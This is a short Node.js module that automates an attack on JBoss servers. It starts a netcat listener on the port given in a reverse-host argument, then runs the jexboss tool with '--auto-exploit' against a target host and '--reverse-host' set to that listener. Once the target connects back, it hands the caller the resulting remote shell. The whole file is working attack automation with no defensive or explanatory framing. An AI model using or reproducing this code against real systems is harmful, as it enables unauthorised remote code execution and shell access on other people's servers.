
const { spawn } = require('child_process');

module.exports = function(host,reverseHost,callback) {
    console.log( ['-vv', '-l', reverseHost.split(':')[1]])
    const nc = spawn('nc', ['-vv', '-l', reverseHost.split(':')[1]]);

    nc.stdout.on('data', (data) => {
        console.log(`nc stdout: ${data}`);
        callback(nc);
    });

    nc.stderr.on('data', (data) => {
        console.log(`nc stderr: ${data}`);
    });

    nc.on('close', (code) => {
        console.log(`nc child process exited with code ${code}`);
    });

    const jexboss = spawn('python', ['jexboss/jexboss.py', '--auto-exploit', '-host', host,
        '--reverse-host', reverseHost]);

    jexboss.stdout.on('data', (data) => {
        console.log(`jexboss stdout: ${data}`);
        if (data.indexOf('Type [ENTER] to continue...') > -1) {
            nc.stdin.write('\n');
        }
    });

    jexboss.stderr.on('data', (data) => {
        console.log(`jexboss stderr: ${data}`);
    });

    jexboss.on('close', (code) => {
        console.log(`jexboss child process exited with code ${code}`);
    });

}